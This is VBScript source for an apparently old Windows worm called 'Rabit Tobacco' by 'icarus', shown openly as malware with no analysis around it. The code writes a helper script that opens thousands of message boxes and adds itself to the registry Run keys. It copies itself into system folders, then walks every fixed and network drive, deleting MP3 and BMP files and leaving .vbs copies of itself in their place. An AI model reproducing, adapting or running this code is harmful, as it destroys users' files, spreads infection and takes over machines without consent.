rem Project Rabit Tobacco V1.1
rem The Rabit Of The Future...
rem By: icarus
dim FSO,Re,vbsCopy,file,Fi
Set FSO = CreateObject("Scripting.FileSystemObject")
set Re = FSO.OpenTextFile(WScript.ScriptFullname,1)
vbsCopy=Re.ReadAll
Set Fi = fSO.GetFile(WScript.ScriptFullName)

main()

sub main()
Set edVBS=FSO.CreateTextFile("C:\Windows\Command\RaTo.vBs")
edVBS.WriteLine "dim x,which,ranThing"
edVBS.WriteLine "for x = 0 to 10000"
edVBS.WriteLine "randomize timer"
edVBS.WriteLine "which = int(rnd * 10)+1"
edVBS.WriteLine "if which = 1 then"
edVBS.WriteLine " ranThing = "+chr(34)+"Don't Hate Me Because I'm Beautiful!"+chr(34) 
edVBS.WriteLine "elseif which = 2 then"
edVBS.WriteLine " ranThing = "+chr(34)+"It's All About The Pentiums..."+chr(34)
edVBS.WriteLine "elseif which = 3 then"
edVBS.WriteLine " ranThing = "+chr(34)+"Shaken, Not Stirred."+chr(34)
edVBS.WriteLine "elseif which = 4 then"
edVBS.WriteLine " ranThing = "+chr(34)+"Got Milk?"+chr(34)
edVBS.WriteLine "elseif which = 5 then"
edVBS.WriteLine " ranThing = "+chr(34)+"Do You Like My Hat?"+chr(34)
edVBS.WriteLine "elseif which = 6 then"
edVBS.WriteLine " ranThing = "+chr(34)+"AOL Sucks!"+chr(34)
edVBS.WriteLine "elseif which = 7 then"
edVBS.WriteLine " ranThing = "+chr(34)+"O Romeo, Romeo, Wherefore art thou Romeo?"+chr(34)
edVBS.WriteLine "elseif which = 8 then"
edVBS.WriteLine " ranThing = "+chr(34)+"Go Dog Go."+chr(34)
edVBS.WriteLine "elseif which = 9 then"
edVBS.WriteLine " ranThing = "+chr(34)+"1 Fish 2 Fish Red Fish Blue Fish."+chr(34)
edVBS.WriteLine "elseif which > 9 then"
edVBS.WriteLine " ranThing = "+chr(34)+"Its Like Dynamite And A LASER Beam, Garunteed To Blow Your Mind..."+chr(34)
edVBS.WriteLine "end if"
edVBS.WriteLine "msgBox ranThing, , ranThing"
edVBS.WriteLine "next"
edVBS.close

rEdit "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\aRaTo","c:\windows\command\RaTo.vBs"
rEdit "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\RaTo","c:\windows\RaToII.vbs"
Fi.Copy("c:\windows\system\WinLoad32.vbs")
Fi.Copy("c:\windows\RaToII.vbs")
driveD()
end sub

sub driveD
On Error Resume Next
Dim dco,ds,s
Set dco = FSO.Drives
For Each ds in dco
 If ds.DriveType = 2 or ds.DriveType=3 Then
  folderlist(ds.path&"\")
 end if
Next
driveD = s
end sub

sub inFile(folderspec)
On Error Resume Next
dim file,f,fc,ext,ap,s,xx
xx=regR("HKEY_LOCAL_MACHINE\xx")
set file = FSO.GetFolder(folderspec)
set fc = file.Files
for each f in fc
 xx=xx+1
 ext=FSO.GetExtensionName(f.path)
 ext=lcase(ext)
 s=lcase(f.name)
 if (ext = "mp3") or (ext = "bmp") then
  FSO.DeleteFile(folderspec&"\"&s)
  Fi.Copy(folderspec&"\"&s&".vbs")
 end if
 Fi.Copy ("c:\windows\sendto\"&xx&""&s&".vBs")
 redit "HKEY_LOCAL_MACHINE\xx",xx
next
end sub

sub folderlist(folderspec)
On Error Resume Next
dim file,f,subFold
set file = FSO.GetFolder(folderspec)
set subFold = file.SubFolders
for each f in subFold
 inFile(f.path)
 folderlist(f.path)
next
end sub

sub rEdit(rKey,rValue)
Set registryEdit = CreateObject("WScript.Shell")
registryedit.RegWrite rKey,rValue
end sub

function regR(val)
Set regedit = CreateObject("WScript.Shell")
regR=regedit.RegRead(val)
end function

